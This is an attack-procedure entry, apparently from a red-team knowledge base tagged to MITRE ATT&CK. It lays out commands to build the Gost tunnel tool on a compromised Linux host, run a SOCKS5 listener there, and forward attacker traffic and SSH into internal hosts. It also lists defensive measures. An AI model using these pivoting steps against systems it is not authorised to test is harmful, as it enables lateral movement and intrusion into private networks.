---
type: procedure
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
  - '[[techniques/Valid Accounts|T1078 - Valid Accounts]]'
sub_techniques: []
tags:
  - '[[tags/Gost]]'
  - '[[tags/Network Pivoting Techniques]]'
commands:
  - '[[commands/git-clone-gost-repository]]'
  - '[[commands/cd-to-gost-directory]]'
  - '[[commands/go-build-gost]]'
  - '[[commands/gost-socks5-proxy-server]]'
  - '[[commands/gost-socks5-proxy-client]]'
  - '[[commands/gost-local-port-forward]]'
platforms:
  - Linux
tools:
  - '[[tools/Gost]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# Network-Pivoting-with-Gost

## Summary

This procedure demonstrates how to use the Gost tool to perform network pivoting on a compromised system, enabling lateral movement to internal network resources that are not directly accessible from the attacker's position. By setting up a SOCKS5 proxy or port forwarding, attackers can tunnel traffic through the compromised host to reach hidden segments.

## Description

Network pivoting allows attackers to leverage a foothold in a network to access otherwise isolated systems. Gost, a simple and secure tunnel tool, facilitates this by creating proxies and forwarders. On the compromised system (acting as the server), a SOCKS5 listener is established. From the attacker's machine (client), traffic is forwarded through this proxy to pivot into the internal network. This technique is commonly used in red team engagements for lateral movement after initial access. It requires compilation from source if not pre-installed, and assumes the compromised system has Go and Git available. Success enables access to internal IPs, services, or further exploitation without direct exposure.

## Requirements

1. Compromised access to a target system within the network (e.g., shell or RCE).
2. Git and Go (version 1.16+) installed on the compromised system.
3. Network connectivity between attacker machine and compromised host.
4. Administrative privileges on the compromised system for binding to low ports (optional, but recommended).
5. [[tools/Gost]] binary built or available.

## Defense

Defensive measures and detection strategies:

- Implement network segmentation with firewalls to restrict lateral traffic between hosts.
- Monitor for unusual outbound connections from internal systems, especially to attacker IPs on non-standard ports.
- Deploy endpoint detection tools to identify unauthorized binary compilation (e.g., Go build processes) and proxy traffic patterns.
- Use application whitelisting to prevent execution of unsigned or ad-hoc built tools like Gost.
- Enable logging for process creation and network connections to detect proxy setups.

## Objectives

1. Establish a proxy tunnel through the compromised host to access internal network resources.
2. Enable lateral movement to systems not directly reachable from the external attacker position.
3. Maintain persistent access for further reconnaissance or exploitation without alerting perimeter defenses.

## Instructions

### Step 1: Clone the Gost Repository

**Context**: Download the Gost source code from GitHub to the compromised system to prepare for building the binary.

**Command** ([[commands/git-clone-gost-repository]]):
```bash
git clone https://github.com/ginuerzh/gost
```

> This command fetches the Gost repository. Expected output includes progress messages ending with 'Cloning into 'gost'...'. Verify by checking for the 'gost' directory with `ls gost`.

### Step 2: Navigate to Build Directory

**Context**: Change to the directory containing the build files to prepare for compilation.

**Command** ([[commands/cd-to-gost-directory]]):
```bash
cd gost/cmd/gost
```

> This positions the shell in the correct path. Expected output is a prompt change to reflect the new directory. Confirm with `pwd` showing '/path/to/gost/cmd/gost'.

### Step 3: Build the Gost Binary

**Context**: Compile the Gost tool from source to create the executable for proxy operations.

**Command** ([[commands/go-build-gost]]):
```bash
go build
```

> This generates the 'gost' binary. Expected output is minimal (no errors); success is indicated by the presence of the 'gost' executable file, verifiable with `ls -la gost` showing permissions like -rwxr-xr-x.

### Step 4: Start SOCKS5 Proxy on Compromised Host (Server Side)

**Context**: Launch Gost as a SOCKS5 server on the compromised system to listen for incoming proxy connections.

**Command** ([[commands/gost-socks5-proxy-server]]):
```bash
gost -L=socks5://:1080
```

> This binds a SOCKS5 listener on port 1080. Expected output: 'gost started on :1080'. The process runs in the foreground; use nohup or screen for background if needed. Verify with `netstat -tuln | grep 1080` showing the listener.

### Step 5: Connect from Attacker Machine (Client Side)

**Context**: From the attacker's system, forward local traffic through the SOCKS5 proxy on the compromised host.

**Command** ([[commands/gost-socks5-proxy-client]]):
```bash
gost -L=:8080 -F=socks5://$_COMPROMISED_IP:1080?notls=true
```

> Replace $_COMPROMISED_IP with the IP of the compromised host. This sets up a local SOCKS5 proxy on port 8080 forwarding to the server. Expected output: 'gost started on :8080'. Test by configuring a browser or tool (e.g., curl) to use localhost:8080 as SOCKS proxy and accessing an internal IP.

### Step 6: Setup Local Port Forwarding (Optional)

**Context**: Forward a specific local port to a remote service via the proxy for targeted access.

**Command** ([[commands/gost-local-port-forward]]):
```bash
gost -L=tcp://:2222/$_INTERNAL_IP:22 -F=socks5://$_COMPROMISED_IP:1080?notls=true
```

> Replace $_INTERNAL_IP with the target internal host IP. This forwards local port 2222 to SSH on the internal host via the proxy. Expected output: 'gost started on :2222'. Success: Connect to localhost:2222 to reach the internal SSH; verify with `ssh user@localhost -p 2222`.

> If the proxy chain is already set (from Step 5), the -F flag chains to it. Monitor for errors like connection refused, indicating firewall blocks or incorrect IPs.
